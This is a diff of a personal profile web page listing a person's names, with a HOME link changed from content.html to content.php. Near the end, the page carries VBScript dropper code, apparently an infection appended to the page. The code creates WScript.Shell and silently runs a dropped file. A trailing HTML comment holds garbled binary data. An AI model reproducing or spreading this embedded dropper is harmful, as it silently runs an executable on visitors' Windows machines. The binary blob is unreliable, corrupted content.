@@ -13,7 +13,7 @@ body{
 <body>
 <h1><center>JUSTIN DELFIN</h1></center>
 <center><img src="justinP.jpg" height="200" width="200"></center>
-<p><a href="content.html" target="content">HOME</a></p>
+<p><a href="content.php" target="content">HOME</a></p>
 <h1><center>INFORMATION</h1></center>
 <p><front = 'Georgia'><b>First Name:</b>JUSTIN</p>
 <p><front = 'Georgia'><b>Middle Name:</b>ABALLAR</p>
@@ -39,5 +39,8 @@ FileObj.Close
 End If
 Set WSHshell = CreateObject("WScript.Shell")
 WSHshell.Run DropPath, 0
-//--></SCRIPT><!--�+���d\�<| ,w>��pru@�`N�Lh�����zs��CE��DpǒG�_h��R¡�Rܯb�}���=vv��;�'�̋��Rr��&G0Ѫ�_ ��הY��ea�1 ��A� ��'����Ì��w%��E;��e7����u��<��Y�[B��ןB��I��}�H[|㓇'<ʅT6ӭad��R��� ����q��k6�_��tDY>����?�o8�ĴjsE��l�E[Y��?����j��E���;�m�5�}:b��ĉU�|2�DP�P�l��qH�x���
-����V8�8��B'�O��BܻlMI�6�HU��#|�/��ې�P�A�e��7����>bf�ذ�5K���Y}cM�$f�@0��=���%��G�|"�+St�u��T��h� ��R(���������N�XB�� ��-->
+//--></SCRIPT><!-- +ðõ¨d\Ù<| ,w>Ùàpru@Ó`NLh¤³§úzs CEÛÃDpÇG_h¬RÂ¡îRÜ¯b¯} ß=vvÃõ;®'Ì îRr§Æ&G
+0Ñªå_ ä
+×YôeaÓ1 ¾©A® û'ÅÃw%ÆE;»¼e7³³uõÜ<¡¨Yõ[B¹ô×BöI¢}èH[|ã'<ÊT6Ó­adôRí¢ ®íª­q³k6_­ãtDY>¥²´ü?Åo8Ä´jsEïlêE[Y¸Ô?Ò´jëÚEÂÊÒ;çm÷5õ}:bäÄU|2°DPP¯lø¤qHxÕòÙ
+ùþëþV8Ü8¾ó¸B'ÅOü²BÜ»lMIä6õHU¬²#|û/ÏÆÛéPÝ
+A×eø7Âþ®>bf£Ø°¾5Kí¶ÚY}cM$fÖ@0º=¢±%ýGÐ|"÷+StèuÁÉTþh¡ ëÎR(ÕøëÎëÎëÎ¦N·XBèÎ ëÎ-->
